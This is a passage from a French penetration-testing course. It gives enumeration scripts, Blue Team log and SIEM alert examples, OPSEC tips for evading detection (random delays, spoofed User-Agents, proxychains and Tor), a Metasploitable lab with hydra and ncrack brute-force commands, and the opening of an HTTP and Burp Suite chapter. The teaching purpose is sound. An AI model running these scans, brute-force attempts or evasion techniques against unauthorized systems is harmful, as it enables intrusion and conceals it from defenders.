            echo "[*] Énumération MSSQL (port 1433)..."
            log_cmd "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 $TARGET" "11_mssql_enum.txt"
            ;;
        3306)
            echo "[*] Énumération MySQL (port 3306)..."
            log_cmd "nmap --script mysql-info,mysql-empty-password,mysql-users -p 3306 $TARGET" "12_mysql_enum.txt"
            ;;
        3389)
            echo "[*] Énumération RDP (port 3389)..."
            log_cmd "nmap --script rdp-ntlm-info -p 3389 $TARGET" "13_rdp_enum.txt"
            ;;
    esac
done

# Génération du rapport de synthèse
echo "[*] Génération du rapport de synthèse..."
{
    echo "# Rapport d'énumération pour $TARGET"
    echo "Date: $(date)"
    echo
    echo "## Ports ouverts"
    grep "open" "$OUTPUT_DIR/01_nmap_full.txt" | grep -v "filtered"
    echo
    echo "## Services détectés"
    grep "Service Info:" "$OUTPUT_DIR/01_nmap_full.txt" || echo "Aucune information de service détectée"
    echo
    echo "## Partages SMB"
    grep -A 20 "Share Enumeration" "$OUTPUT_DIR/07_enum4linux.txt" || echo "Aucun partage SMB détecté"
    echo
    echo "## Utilisateurs"
    grep -A 20 "Users" "$OUTPUT_DIR/07_enum4linux.txt" || echo "Aucun utilisateur détecté"
    echo
    echo "## Vulnérabilités potentielles"
    grep -i "vulnerability" "$OUTPUT_DIR/"*.txt || echo "Aucune vulnérabilité évidente détectée"
} > "$OUTPUT_DIR/00_rapport_synthese.txt"

echo "[+] Énumération terminée. Rapport de synthèse disponible dans $OUTPUT_DIR/00_rapport_synthese.txt"
```

### Vue Blue Team / logs générés / alertes SIEM

L'énumération génère des traces qui peuvent être détectées par les équipes de sécurité défensive. Comprendre ces traces est essentiel pour une approche OPSEC efficace.

#### Traces générées par l'énumération Linux

1. **Logs d'authentification**
   - Tentatives de connexion échouées dans `/var/log/auth.log`
   - Connexions SSH dans `/var/log/auth.log` ou `/var/log/secure`

   **Exemple de log SSH :**
   ```
   May 15 14:23:45 server sshd[1234]: Failed password for invalid user test from 192.168.1.100 port 54321 ssh2
   ```

2. **Logs de service**
   - Accès FTP dans `/var/log/vsftpd.log`
   - Requêtes web dans `/var/log/apache2/access.log`
   - Accès SMB dans `/var/log/samba/log.smbd`

   **Exemple de log Apache :**
   ```
   192.168.1.100 - - [15/May/2023:14:23:45 +0200] "GET /admin.php HTTP/1.1" 404 499 "-" "gobuster/3.1.0"
   ```

3. **Logs système**
   - Connexions réseau dans `/var/log/syslog`
   - Activités SNMP dans `/var/log/syslog`

#### Traces générées par l'énumération Windows

1. **Logs d'événements Windows**
   - Tentatives d'authentification dans "Security Log" (Event ID 4625)
   - Connexions réussies dans "Security Log" (Event ID 4624)
   - Accès aux partages dans "Security Log" (Event ID 5140)

   **Exemple d'événement de tentative d'authentification échouée :**
   ```
   Event ID: 4625
   An account failed to log on.
   Account Name: test
   Source Network Address: 192.168.1.100
   ```

2. **Logs de service**
   - Requêtes web dans les logs IIS
   - Activités RPC dans les logs système
   - Requêtes LDAP dans les logs du contrôleur de domaine

3. **Logs de pare-feu**
   - Connexions bloquées ou autorisées
   - Tentatives de scan de ports

#### Détection par les systèmes de sécurité

1. **IDS/IPS**
   - Détection de signatures d'outils d'énumération (enum4linux, nmap)
   - Détection de comportements anormaux (multiples requêtes en séquence)
   - Alertes sur les tentatives d'authentification échouées

2. **SIEM**
   - Corrélation d'événements d'énumération provenant de différentes sources
   - Détection de patterns temporels (activités séquentielles)
   - Alertes basées sur la réputation des adresses IP

3. **EDR (Endpoint Detection and Response)**
   - Détection d'exécution de scripts d'énumération
   - Identification de processus établissant de nombreuses connexions
   - Alertes sur les tentatives d'accès aux fichiers sensibles

#### Alertes SIEM typiques

**Alerte d'énumération d'utilisateurs :**
```
[ALERT] User Enumeration Detected
Source IP: 192.168.1.100
Target: 192.168.1.20
Time: 2023-05-15 14:23:45
Details: Multiple failed authentication attempts with different usernames
Severity: Medium
```

**Alerte de scan de partages SMB :**
```
[ALERT] SMB Share Enumeration Detected
Source IP: 192.168.1.100
Target: 192.168.1.20
Time: 2023-05-15 14:30:12
Details: Multiple SMB queries for share information
Severity: Medium
```

**Alerte d'exécution de script d'énumération :**
```
[ALERT] Enumeration Script Detected
Host: WIN-DC01
Process: powershell.exe
Time: 2023-05-15 14:35:27
Details: PowerShell script with enumeration patterns detected
Severity: High
```

### Pièges classiques et erreurs à éviter

#### Erreurs techniques

1. **Énumération incomplète**
   - Limitation à quelques services évidents
   - Non-vérification des permissions sur les ressources découvertes
   - Oubli des services moins courants

2. **Interprétation incorrecte**
   - Faux positifs dans les résultats d'énumération
   - Confusion entre différentes versions de services
   - Mauvaise compréhension des permissions

3. **Problèmes de performance**
   - Énumération trop agressive causant des timeouts
   - Surcharge des services cibles
   - Blocage de compte par tentatives excessives

#### Erreurs OPSEC

1. **Signature évidente**
   - Utilisation d'outils avec des signatures reconnaissables
   - User-Agent par défaut révélant l'outil utilisé
   - Énumération depuis une adresse IP directement attribuable

2. **Comportement prévisible**
   - Énumération séquentielle des utilisateurs
   - Timing régulier entre les requêtes
   - Progression logique des phases d'énumération

3. **Bruit excessif**
   - Tentatives d'authentification multiples et rapides
   - Scan simultané de nombreux services
   - Exécution de scripts d'énumération bruyants

### OPSEC Tips : énumération discrète

#### Techniques de base

1. **Ralentissement des activités**
   ```bash
   # Ajout de délais entre les requêtes
   for user in $(cat users.txt); do
       rpcclient -U "" 192.168.1.20 -c "queryuser $user"
       sleep $((RANDOM % 10 + 5))
   done
   ```

2. **Limitation de la portée**
   ```bash
   # Énumération ciblée plutôt qu'exhaustive
   # Au lieu de scanner tous les utilisateurs possibles, cibler ceux probables
   rpcclient -U "" 192.168.1.20 -c "queryuser Administrator"
   rpcclient -U "" 192.168.1.20 -c "queryuser Guest"
   ```

3. **Utilisation de techniques passives**
   ```bash
   # Analyse des bannières plutôt que scan actif
   nc -nv 192.168.1.20 22
   nc -nv 192.168.1.20 21
   ```

#### Techniques avancées

1. **Modification des signatures**
   ```bash
   # Modification du User-Agent pour les requêtes web
   curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://192.168.1.20
   
   # Utilisation de gobuster avec un User-Agent personnalisé
   gobuster dir -u http://192.168.1.20 -w wordlist.txt -a "Mozilla/5.0"
   ```

2. **Distribution temporelle**
   ```bash
   # Script pour répartir l'énumération dans le temps
   services=("ftp" "ssh" "http" "smb")
   for service in "${services[@]}"; do
       case $service in
           "ftp") nc -nv 192.168.1.20 21 ;;
           "ssh") nc -nv 192.168.1.20 22 ;;
           "http") curl -s -I http://192.168.1.20 ;;
           "smb") smbclient -L //192.168.1.20 -N ;;
       esac
       sleep $((RANDOM % 300 + 60))  # Pause de 1-5 minutes
   done
   ```

3. **Utilisation de proxies**
   ```bash
   # Énumération via proxychains
   proxychains smbclient -L //192.168.1.20 -N
   
   # Utilisation de Tor pour l'énumération web
   torify curl http://192.168.1.20
   ```

#### Script d'énumération OPSEC

Voici un exemple de script pour réaliser une énumération discrète :

```bash
#!/bin/bash
# stealth_enum.sh - Énumération discrète avec techniques OPSEC

if [ $# -lt 1 ]; then
    echo "Usage: $0 <target> [output_dir]"
    exit 1
fi

TARGET=$1
OUTPUT_DIR=${2:-"stealth_enum_$(date +%Y%m%d_%H%M%S)"}

mkdir -p "$OUTPUT_DIR"
echo "[+] Démarrage de l'énumération discrète sur $TARGET"
echo "[+] Les résultats seront enregistrés dans $OUTPUT_DIR"

# Fonction pour exécuter une commande avec délai aléatoire
run_cmd() {
    local cmd=$1
    local outfile=$2
    local min_delay=$3
    local max_delay=$4
    
    echo "[*] Exécution de: $cmd"
    eval "$cmd" > "$OUTPUT_DIR/$outfile" 2>&1
    echo "[+] Résultats enregistrés dans $OUTPUT_DIR/$outfile"
    
    # Délai aléatoire
    local delay=$((RANDOM % (max_delay - min_delay + 1) + min_delay))
    echo "[*] Pause de $delay secondes..."
    sleep $delay
}

# Phase 1: Reconnaissance passive
echo "[*] Phase 1: Reconnaissance passive..."
run_cmd "ping -c 1 $TARGET" "01_ping.txt" 5 15

# Phase 2: Scan de ports discret
echo "[*] Phase 2: Scan de ports discret..."
run_cmd "nmap -T2 -sS -n --randomize-ports -p 21,22,23,25,80,139,445,3389 $TARGET" "02_ports.txt" 30 60

# Extraction des ports ouverts
OPEN_PORTS=$(grep "open" "$OUTPUT_DIR/02_ports.txt" | cut -d "/" -f 1)

# Phase 3: Énumération discrète par service
echo "[*] Phase 3: Énumération discrète par service..."

for port in $OPEN_PORTS; do
    case $port in
        21)
            echo "[*] Énumération FTP discrète..."
            run_cmd "nc -nv -w 5 $TARGET 21 < /dev/null" "03_ftp_banner.txt" 20 40
            ;;
        22)
            echo "[*] Énumération SSH discrète..."
            run_cmd "nc -nv -w 5 $TARGET 22 < /dev/null" "04_ssh_banner.txt" 20 40
            ;;
        80|443)
            proto="http"
            [[ $port -eq 443 ]] && proto="https"
            echo "[*] Énumération Web discrète..."
            run_cmd "curl -s -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -I $proto://$TARGET" "05_web_headers_$port.txt" 15 30
            
            # Énumération de quelques chemins courants avec délais
            for path in "" "robots.txt" "admin" "login" "wp-login.php"; do
                run_cmd "curl -s -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' $proto://$TARGET/$path" "06_web_${path:-index}_$port.txt" 30 60
            done
            ;;
        139|445)
            echo "[*] Énumération SMB discrète..."
            # Test de session null sans énumération complète
            run_cmd "smbclient -L //$TARGET -N" "07_smb_shares.txt" 25 45
            ;;
        3389)
            echo "[*] Vérification RDP discrète..."
            run_cmd "nmap -T2 -sS -n -p 3389 --script rdp-ntlm-info $TARGET" "08_rdp_info.txt" 20 40
            ;;
    esac
done

# Phase 4: Génération du rapport
echo "[*] Phase 4: Génération du rapport..."
{
    echo "# Rapport d'énumération discrète pour $TARGET"
    echo "Date: $(date)"
    echo
    echo "## Ports ouverts"
    grep "open" "$OUTPUT_DIR/02_ports.txt" || echo "Aucun port ouvert détecté"
    echo
    echo "## Bannières de service"
    for file in "$OUTPUT_DIR"/0[34]_*_banner.txt; do
        if [ -f "$file" ]; then
            echo "### $(basename "$file" | cut -d "_" -f 2)"
            cat "$file"
            echo
        fi
    done
    echo
    echo "## Partages SMB"
    grep "Disk" "$OUTPUT_DIR/07_smb_shares.txt" || echo "Aucun partage SMB détecté ou accessible"
} > "$OUTPUT_DIR/00_rapport_synthese.txt"

echo "[+] Énumération discrète terminée. Rapport disponible dans $OUTPUT_DIR/00_rapport_synthese.txt"
```

### Points clés

- L'énumération est une phase critique qui permet de découvrir les vecteurs d'attaque potentiels sur les systèmes cibles.
- Les techniques d'énumération diffèrent significativement entre les systèmes Linux et Windows.
- Des outils spécialisés comme enum4linux-ng, RPCclient et SMBmap facilitent l'énumération des systèmes Windows et Samba.
- L'automatisation de l'énumération permet de gagner du temps et d'assurer une couverture complète.
- Les activités d'énumération génèrent des traces détectables par les équipes de sécurité défensive.
- Des techniques OPSEC appropriées permettent de réduire significativement la détectabilité des activités d'énumération.

### Mini-quiz (3 QCM)

1. **Quelle commande permet d'énumérer les utilisateurs d'un domaine Windows via RPC ?**
   - A) `smbclient -L //192.168.1.20 -N`
   - B) `rpcclient -U "" 192.168.1.20 -c "enumdomusers"`
   - C) `enum4linux -u 192.168.1.20`
   - D) `nmap -p 445 --script smb-enum-users 192.168.1.20`

   *Réponse : B*

2. **Quelle technique d'énumération est la plus discrète du point de vue OPSEC ?**
   - A) Scan Nmap complet avec détection de version
   - B) Exécution de scripts d'énumération automatisés comme LinPEAS
   - C) Tentatives d'authentification séquentielles avec une liste d'utilisateurs
   - D) Analyse passive des bannières de service avec délais aléatoires

   *Réponse : D*

3. **Quel type de log Windows enregistre les tentatives d'authentification échouées ?**
   - A) Application Log
   - B) System Log
   - C) Security Log (Event ID 4625)
   - D) Setup Log

   *Réponse : C*

### Lab/Exercice guidé : Énumération complète d'une cible

#### Objectif
Réaliser une énumération complète d'une machine cible en utilisant des techniques OPSEC pour minimiser la détection.

#### Prérequis
- Kali Linux
- Accès réseau à la cible (environnement de laboratoire)
- Machine cible : Metasploitable 2 (Linux) ou une machine Windows de laboratoire

#### Étapes

1. **Préparation de l'environnement**

```bash
# Création du répertoire de travail
mkdir -p ~/pentest_labs/enumeration_lab
cd ~/pentest_labs/enumeration_lab

# Création du script d'énumération
cat > enum_target.sh << 'EOF'
#!/bin/bash
# Script d'énumération avec considérations OPSEC

TARGET=$1
OUTPUT_DIR="enum_results_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"
echo "[+] Résultats sauvegardés dans $OUTPUT_DIR"

# Fonction pour exécuter une commande avec délai
run_cmd() {
    local cmd=$1
    local outfile=$2
    local delay=${3:-5}
    
    echo "[*] Exécution de: $cmd"
    eval "$cmd" > "$OUTPUT_DIR/$outfile" 2>&1
    echo "[+] Résultats enregistrés dans $OUTPUT_DIR/$outfile"
    sleep $delay
}

# Phase 1: Découverte initiale
echo "[*] Phase 1: Découverte initiale..."
run_cmd "nmap -T2 -sS -p 21,22,23,25,80,139,445,3306,3389 $TARGET" "01_initial_scan.txt" 10

# Phase 2: Énumération par service
echo "[*] Phase 2: Énumération par service..."

# Vérification FTP
if grep -q "21/tcp.*open" "$OUTPUT_DIR/01_initial_scan.txt"; then
    echo "[*] Énumération FTP..."
    run_cmd "nc -nv -w 5 $TARGET 21 < /dev/null" "02_ftp_banner.txt" 8
    run_cmd "nmap -T2 -sS -p 21 --script ftp-anon $TARGET" "03_ftp_anon.txt" 12
fi

# Vérification SSH
if grep -q "22/tcp.*open" "$OUTPUT_DIR/01_initial_scan.txt"; then
    echo "[*] Énumération SSH..."
    run_cmd "nc -nv -w 5 $TARGET 22 < /dev/null" "04_ssh_banner.txt" 7
fi

# Vérification Web
if grep -q "80/tcp.*open\|443/tcp.*open" "$OUTPUT_DIR/01_initial_scan.txt"; then
    echo "[*] Énumération Web..."
    run_cmd "curl -s -A 'Mozilla/5.0' -I http://$TARGET" "05_web_headers.txt" 6
    run_cmd "curl -s -A 'Mozilla/5.0' http://$TARGET | grep -i 'title\|meta'" "06_web_title.txt" 8
    
    # Énumération de quelques chemins courants
    for path in "robots.txt" "admin" "login.php" "wp-login.php"; do
        run_cmd "curl -s -A 'Mozilla/5.0' -I http://$TARGET/$path" "07_web_${path}.txt" 15
    done
fi

# Vérification SMB
if grep -q "139/tcp.*open\|445/tcp.*open" "$OUTPUT_DIR/01_initial_scan.txt"; then
    echo "[*] Énumération SMB..."
    run_cmd "smbclient -L //$TARGET -N" "08_smb_shares.txt" 10
    
    # Si des partages sont détectés, tenter d'y accéder
    if grep -q "Disk" "$OUTPUT_DIR/08_smb_shares.txt"; then
        shares=$(grep "Disk" "$OUTPUT_DIR/08_smb_shares.txt" | awk '{print $1}')
        for share in $shares; do
            run_cmd "smbclient //$TARGET/$share -N -c 'ls'" "09_smb_${share}_content.txt" 12
        done
    fi
    
    # Énumération RPCClient
    run_cmd "rpcclient -U \"\" $TARGET -c 'srvinfo'" "10_rpc_srvinfo.txt" 8
    run_cmd "rpcclient -U \"\" $TARGET -c 'enumdomusers'" "11_rpc_users.txt" 15
fi

# Vérification MySQL
if grep -q "3306/tcp.*open" "$OUTPUT_DIR/01_initial_scan.txt"; then
    echo "[*] Énumération MySQL..."
    run_cmd "nmap -T2 -sS -p 3306 --script mysql-info,mysql-empty-password $TARGET" "12_mysql_info.txt" 10
fi

# Phase 3: Génération du rapport
echo "[*] Phase 3: Génération du rapport..."
{
    echo "# Rapport d'énumération pour $TARGET"
    echo "Date: $(date)"
    echo
    echo "## Services détectés"
    grep "open" "$OUTPUT_DIR/01_initial_scan.txt"
    echo
    
    if [ -f "$OUTPUT_DIR/08_smb_shares.txt" ]; then
        echo "## Partages SMB"
        grep "Disk" "$OUTPUT_DIR/08_smb_shares.txt" || echo "Aucun partage SMB détecté ou accessible"
        echo
    fi
    
    if [ -f "$OUTPUT_DIR/11_rpc_users.txt" ]; then
        echo "## Utilisateurs"
        cat "$OUTPUT_DIR/11_rpc_users.txt" || echo "Aucun utilisateur détecté"
        echo
    fi
    
    echo "## Bannières de service"
    for file in "$OUTPUT_DIR"/0[24]_*_banner.txt; do
        if [ -f "$file" ]; then
            echo "### $(basename "$file" | cut -d "_" -f 2)"
            cat "$file"
            echo
        fi
    done
    
    echo "## Accès potentiels"
    if grep -q "Anonymous login successful" "$OUTPUT_DIR/03_ftp_anon.txt"; then
        echo "- Accès FTP anonyme possible"
    fi
    
    for file in "$OUTPUT_DIR"/09_smb_*_content.txt; do
        if [ -f "$file" ]; then
            share=$(basename "$file" | cut -d "_" -f 2)
            echo "- Accès au partage SMB '$share' sans authentification"
        fi
    done
    
    if grep -q "empty password" "$OUTPUT_DIR/12_mysql_info.txt"; then
        echo "- Accès MySQL possible avec mot de passe vide"
    fi
} > "$OUTPUT_DIR/00_rapport_synthese.txt"

echo "[+] Énumération terminée. Rapport disponible dans $OUTPUT_DIR/00_rapport_synthese.txt"
EOF

# Rendre le script exécutable
chmod +x enum_target.sh
```

2. **Exécution de l'énumération**

```bash
# Pour une cible Linux (Metasploitable 2)
./enum_target.sh 192.168.1.50

# Pour une cible Windows
./enum_target.sh 192.168.1.20
```

3. **Analyse des résultats**

```bash
# Affichage du rapport de synthèse
cat enum_results_*/00_rapport_synthese.txt

# Analyse des services détectés
grep "open" enum_results_*/01_initial_scan.txt

# Analyse des partages SMB
cat enum_results_*/08_smb_shares.txt

# Analyse des utilisateurs
cat enum_results_*/11_rpc_users.txt
```

4. **Énumération approfondie basée sur les résultats initiaux**

Pour une cible Linux (Metasploitable 2) :
```bash
# Si un serveur web est détecté
nikto -h http://192.168.1.50 -output nikto_results.txt

# Si MySQL est accessible
mysql -h 192.168.1.50 -u root -p
# Essayer un mot de passe vide ou "password", "root", etc.

# Si SSH est accessible
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.1.50 ssh
```

Pour une cible Windows :
```bash
# Si des partages SMB sont accessibles
smbmap -H 192.168.1.20 -u "" -p ""

# Si RPC est accessible
rpcclient -U "" 192.168.1.20
rpcclient $> enumdomusers
rpcclient $> getdompwinfo

# Si RDP est accessible
ncrack -vv --user Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.20
```

#### Vue Blue Team

Dans un environnement réel, cette énumération discrète générerait moins d'alertes qu'une approche standard :

1. **Logs générés**
   - Connexions individuelles espacées dans le temps
   - Tentatives d'accès limitées aux ressources probables
   - Signatures modifiées (User-Agent personnalisé)

2. **Alertes potentielles**
   - Détection de reconnaissance à faible intensité
   - Alertes de niveau inférieur en raison du volume réduit
   - Possibilité de passer sous les seuils d'alerte

3. **Contre-mesures possibles**
   - Détection basée sur le comportement sur une période plus longue
   - Corrélation d'événements de faible intensité
   - Analyse de réputation d'adresse IP

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir réalisé une énumération complète avec des techniques OPSEC
- Comprendre les différences entre l'énumération Linux et Windows
- Être capable d'identifier les services vulnérables et les vecteurs d'attaque potentiels
- Apprécier l'importance du timing et de la discrétion dans les activités d'énumération
- Avoir obtenu un rapport détaillé des services, utilisateurs et accès potentiels
# PARTIE I : FONDATIONS eJPT (+ OPSEC NIVEAU 1)

## Chapitre 6 : Web basics

### Introduction : Pourquoi ce thème est important

La sécurité des applications web est un domaine fondamental du pentesting moderne, car les applications web constituent souvent la surface d'attaque la plus exposée d'une organisation. Comprendre les bases du protocole HTTP, savoir configurer et utiliser des outils comme Burp Suite, et maîtriser les techniques de découverte de contenu sont des compétences essentielles pour tout pentester. Ce chapitre vous fournira les connaissances nécessaires pour identifier et exploiter les vulnérabilités web courantes, tout en intégrant les considérations OPSEC pour minimiser la détection de vos activités par les équipes défensives.

### Protocole HTTP : méthodes, codes de statut, en-têtes

Le protocole HTTP (HyperText Transfer Protocol) est le fondement des communications sur le web. Une compréhension approfondie de son fonctionnement est essentielle pour tester efficacement les applications web.

#### Méthodes HTTP

Les méthodes HTTP définissent l'action à effectuer sur une ressource.

1. **GET** : Demande une représentation de la ressource spécifiée
   ```http
   GET /index.html HTTP/1.1
   Host: example.com
   ```
   - Utilisée pour récupérer des données
   - Les paramètres sont visibles dans l'URL
   - Ne devrait pas modifier l'état du serveur
   - **Implications pentesting** : Manipulation de paramètres dans l'URL, injection dans les query strings

2. **POST** : Soumet des données pour être traitées
   ```http
   POST /login.php HTTP/1.1
   Host: example.com
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 27
   
   username=admin&password=1234
   ```
   - Utilisée pour envoyer des données au serveur
   - Les paramètres sont dans le corps de la requête
   - Peut modifier l'état du serveur
   - **Implications pentesting** : Manipulation de données de formulaire, injection dans le corps de la requête

3. **PUT** : Remplace la ressource cible par le contenu de la requête
   ```http
   PUT /upload/file.txt HTTP/1.1
   Host: example.com
   Content-Type: text/plain
   Content-Length: 16
   
   Content of file
   ```
   - Utilisée pour créer ou remplacer une ressource
   - **Implications pentesting** : Upload de fichiers malveillants si mal configuré

4. **DELETE** : Supprime la ressource spécifiée
   ```http
   DELETE /file.txt HTTP/1.1
   Host: example.com
   ```
   - Utilisée pour supprimer une ressource
   - **Implications pentesting** : Suppression non autorisée de contenu si mal configuré

5. **Autres méthodes importantes**
   - **HEAD** : Similaire à GET mais ne retourne que les en-têtes
   - **OPTIONS** : Retourne les méthodes HTTP supportées par le serveur
   - **PATCH** : Applique des modifications partielles à une ressource
   - **TRACE** : Effectue un test de bouclage pour diagnostiquer les problèmes

   ```bash
   # Vérification des méthodes supportées
   curl -X OPTIONS -v http://example.com/
   ```

#### Codes de statut HTTP

Les codes de statut HTTP indiquent le résultat d'une requête.

1. **1xx - Information**
   - **100 Continue** : Le serveur a reçu les en-têtes et le client peut continuer
   - **101 Switching Protocols** : Le serveur change de protocole

2. **2xx - Succès**
   - **200 OK** : La requête a réussi
   - **201 Created** : La requête a été traitée et une ressource a été créée
   - **204 No Content** : La requête a réussi mais pas de contenu à renvoyer

3. **3xx - Redirection**
   - **301 Moved Permanently** : La ressource a été déplacée définitivement
   - **302 Found** : La ressource a été déplacée temporairement
   - **304 Not Modified** : La ressource n'a pas été modifiée depuis la dernière requête

4. **4xx - Erreur client**
   - **400 Bad Request** : La requête est mal formée
   - **401 Unauthorized** : Authentification nécessaire
   - **403 Forbidden** : Accès refusé
   - **404 Not Found** : Ressource non trouvée
   - **405 Method Not Allowed** : Méthode HTTP non autorisée

5. **5xx - Erreur serveur**
   - **500 Internal Server Error** : Erreur interne du serveur
   - **501 Not Implemented** : Fonctionnalité non implémentée
   - **502 Bad Gateway** : Erreur de passerelle
   - **503 Service Unavailable** : Service temporairement indisponible

**Implications pentesting :**
- **401/403** : Potentiel pour contournement d'authentification/autorisation
- **500** : Indication possible d'une vulnérabilité exploitable
- **302** : Peut révéler des redirections non sécurisées

```bash
# Test de différents codes de statut
curl -I http://example.com/  # 200 OK
curl -I http://example.com/nonexistent  # 404 Not Found
curl -I http://example.com/admin  # 401 Unauthorized ou 403 Forbidden
```

#### En-têtes HTTP

Les en-têtes HTTP fournissent des informations supplémentaires sur la requête ou la réponse.

1. **En-têtes de requête courants**
   - **Host** : Domaine de la ressource demandée
   - **User-Agent** : Identifie le client (navigateur, outil)
   - **Cookie** : Données de session
   - **Authorization** : Informations d'authentification
   - **Content-Type** : Type MIME du corps de la requête
   - **Content-Length** : Taille du corps de la requête
   - **Referer** : URL de la page précédente

2. **En-têtes de réponse courants**
   - **Server** : Information sur le serveur web
   - **Set-Cookie** : Définit un cookie
   - **Content-Type** : Type MIME du contenu
   - **Content-Length** : Taille du contenu
   - **Location** : URL pour redirection

3. **En-têtes de sécurité**
   - **X-XSS-Protection** : Contrôle la protection XSS du navigateur
   - **Content-Security-Policy** : Restreint les sources de contenu
   - **X-Frame-Options** : Contrôle si la page peut être affichée dans un iframe
   - **Strict-Transport-Security** : Force HTTPS
   - **X-Content-Type-Options** : Empêche le MIME sniffing

**Implications pentesting :**
- L'en-tête **Server** peut révéler des informations sur la version du serveur
- L'absence d'en-têtes de sécurité peut indiquer des vulnérabilités potentielles
- Les cookies sans attributs de sécurité peuvent être vulnérables

```bash
# Analyse des en-têtes
curl -I http://example.com/

# Analyse des en-têtes de sécurité
curl -s -I http://example.com/ | grep -E 'X-XSS-Protection|Content-Security-Policy|X-Frame-Options|Strict-Transport-Security|X-Content-Type-Options'
```

#### Exemple d'analyse d'une requête/réponse HTTP complète

```bash
# Utilisation de curl avec l'option verbose
curl -v http://example.com/
```

**Requête :**
```
> GET / HTTP/1.1
> Host: example.com
> User-Agent: curl/7.68.0
> Accept: */*
```

**Réponse :**
```
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=UTF-8
< Server: ECS (dcb/7F84)
< Content-Length: 1256
<
<!doctype html>
<html>
<head>
    <title>Example Domain</title>
    ...
</html>
```

### Configuration et utilisation de Burp Suite

Burp Suite est l'outil de référence pour le test d'applications web. Il agit comme un proxy interceptant le trafic entre votre navigateur et l'application web cible.

#### Installation et configuration de base

1. **Installation sur Kali Linux**
   ```bash
   # Burp Suite est préinstallé sur Kali Linux
   # Vérification de l'installation
   which burpsuite
   
   # Lancement de Burp Suite
   burpsuite &
   ```

2. **Configuration du proxy**
   - Dans Burp Suite : Onglet "Proxy" > "Options"
   - Vérifiez que le proxy écoute sur 127.0.0.1:8080
   
   **Configuration de Firefox :**
   - Ouvrez Firefox
   - Allez dans "Préférences" > "Général" > "Paramètres réseau"
   - Sélectionnez "Configuration manuelle du proxy"
   - HTTP Proxy: 127.0.0.1, Port: 8080
   - Cochez "Utiliser ce proxy pour tous les protocoles"

3. **Installation du certificat CA Burp**
   - Dans Burp Suite : Onglet "Proxy" > "Options" > "Import / Export CA Certificate"
   - Sélectionnez "Certificate in DER format" et enregistrez le fichier
   - Dans Firefox : "Préférences" > "Vie privée et sécurité" > "Certificats" > "Afficher les certificats"
   - Onglet "Autorités" > "Importer" > Sélectionnez le fichier CA
   - Cochez "Confirmer cette AC pour identifier des sites web"

#### Fonctionnalités principales

1. **Proxy**
   - Intercepte et modifie les requêtes/réponses
   - Permet d'examiner et de manipuler le trafic HTTP/HTTPS
   
   ```
   # Activation/désactivation de l'interception
   Onglet "Proxy" > "Intercept" > "Intercept is on/off"
   ```

2. **Spider (Crawler)**
   - Découvre automatiquement le contenu du site
   - Suit les liens et soumet les formulaires
   
   ```
   # Lancement du spider
   Clic droit sur un hôte dans "Target" > "Spider this host"
   ```

3. **Scanner (version Pro)**
   - Détecte automatiquement les vulnérabilités
   - Analyse active et passive
   
   ```
   # Lancement du scanner
   Clic droit sur un hôte dans "Target" > "Scan this host"
   ```

4. **Intruder**
   - Automatise les attaques personnalisées
   - Permet le fuzzing et le bruteforce
   
   ```
   # Configuration d'une attaque Intruder
   1. Interceptez une requête
   2. Clic droit > "Send to Intruder"
   3. Onglet "Positions" > Définissez les points d'insertion
   4. Onglet "Payloads" > Configurez les payloads
   5. Cliquez sur "Start attack"
   ```

5. **Repeater**
   - Permet de modifier et renvoyer manuellement des requêtes
   - Utile pour tester des modifications spécifiques
   
   ```
   # Utilisation du Repeater
   1. Interceptez une requête
   2. Clic droit > "Send to Repeater"
   3. Modifiez la requête
   4. Cliquez sur "Send"
   ```

6. **Decoder**
   - Encode/décode différents formats (URL, Base64, etc.)
   - Utile pour analyser des données encodées
   
   ```
   # Utilisation du Decoder
   1. Onglet "Decoder"
   2. Entrez le texte à encoder/décoder
   3. Sélectionnez l'opération (Encode/Decode)
   4. Sélectionnez le format (URL, Base64, etc.)
   ```

7. **Comparer**
   - Compare deux requêtes/réponses
   - Utile pour identifier les différences subtiles
   
   ```
   # Utilisation du Comparer
   1. Sélectionnez deux requêtes/réponses
   2. Clic droit > "Send to Comparer"
   3. Analysez les différences
   ```

#### Configuration OPSEC pour Burp Suite

1. **Modification du User-Agent**
   - Onglet "Proxy" > "Options" > "Match and Replace"
   - Ajoutez une règle pour remplacer l'en-tête User-Agent
   
   ```
   Type: Request header
   Match: User-Agent:.*
   Replace: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
   ```

2. **Limitation du trafic**
   - Onglet "Project options" > "Connections" > "Throttling"
   - Activez "Enable throttling" et définissez un délai entre les requêtes
   
   ```
   # Exemple de configuration
   Fixed delay: 500 ms
   ```

3. **Filtrage des requêtes sensibles**
   - Onglet "Proxy" > "Options" > "Intercept Client Requests"
   - Configurez des règles pour éviter d'intercepter des requêtes vers des domaines sensibles
   
   ```
   # Exemple de règle pour exclure les domaines Google
   Host: .*\.google\.com
   Action: Don't intercept
   ```

### Découverte de contenu : dirb/gobuster/ffuf

La découverte de contenu est une technique essentielle pour identifier les ressources cachées d'une application web.

#### dirb

dirb est un scanner de contenu web qui utilise une approche basée sur dictionnaire.

1. **Installation**
   ```bash
   # Préinstallé sur Kali Linux
   which dirb
   ```

2. **Utilisation de base**
   ```bash
   # Scan simple
   dirb http://example.com
   
   # Utilisation d'un dictionnaire spécifique
   dirb http://example.com /usr/share/wordlists/dirb/big.txt
   
   # Recherche d'extensions spécifiques
   dirb http://example.com -X .php,.txt,.bak
   ```

3. **Options avancées**
   ```bash
   # Définition d'un agent utilisateur
   dirb http://example.com -a "Mozilla/5.0"
   
   # Authentification HTTP Basic
   dirb http://example.com -u admin:password
   
   # Exclusion des codes de statut
   dirb http://example.com -N 404,403
   
   # Délai entre les requêtes (ms)
   dirb http://example.com -z 500
   ```

#### gobuster

gobuster est un outil de découverte de contenu plus rapide et plus flexible que dirb.

1. **Installation**
   ```bash
   # Préinstallé sur Kali Linux
   which gobuster
   
   # Ou installation manuelle
   sudo apt install -y gobuster
